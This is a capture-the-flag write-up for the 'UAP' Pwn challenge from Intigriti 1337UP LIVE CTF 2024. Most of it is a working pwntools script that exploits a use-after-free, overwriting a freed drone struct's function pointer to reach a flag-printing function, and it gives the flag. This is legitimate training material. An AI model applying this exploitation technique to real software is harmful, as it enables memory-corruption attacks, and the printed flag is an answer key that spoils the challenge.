---
name: UAP (2024)
event: Intigriti 1337UP LIVE CTF 2024
category: Pwn
description: Writeup for UAP (Pwn) - 1337UP LIVE CTF (2024) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# UAP

## Challenge Description

> I found a UFO! Wait, they call them UAPs now? Whatever, feel free to take take a look 🔎

## Solution

Wow, I wish I made a writeup for this a couple of months ago when I made the challenge 😬 It's the night before the CTF and I'm tired, so this will be quick.

### solve.py

{% code overflow="wrap" %}
```python
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = './drone'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

# Offset to the 'start_route' function pointer in the Drone struct
offset = 16

# Start program
io = start()

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

def menu_choice(choice):
    io.sendline(str(choice).encode())
    result = io.recvuntil(b"Choose an option:")
    return result

# Step 1: Deploy Drone 1
menu_choice(1)

# Step 2: Retire Drone 1 to trigger UAF (free its memory)
menu_choice(2)
io.sendlineafter(b"Enter drone ID to retire: ", b"1")
io.recvuntil(b"Drone 1 retired.")

# Step 3: Enter drone route to overwrite memory (this should reuse freed memory)
menu_choice(4)
manual_printer_addr = elf.symbols['print_drone_manual']
payload = flat({offset: p64(manual_printer_addr)})

# Send payload to overwrite the freed memory
io.sendlineafter(b"Enter the drone route data: ", payload)

# Step 4: Start the drone's route (trigger the overwritten function pointer)
menu_choice(3)
io.sendlineafter(b"Enter drone ID to start its route: ", b"1")

# Interact with the process to receive the output (manual/flag)
io.recvuntil(b'INTIGRITI')
info('INTIGRITI' + io.recvline().decode())
```
{% endcode %}

Flag: `INTIGRITI{un1d3n71f13d_fly1n6_vuln3r4b1l17y}`

Told ya ✅

If you want to learn more about use-after-free vulnerabilities, I've made [detailed videos](https://www.youtube.com/watch?v=YGQAvJ__12k) in the past 🙂
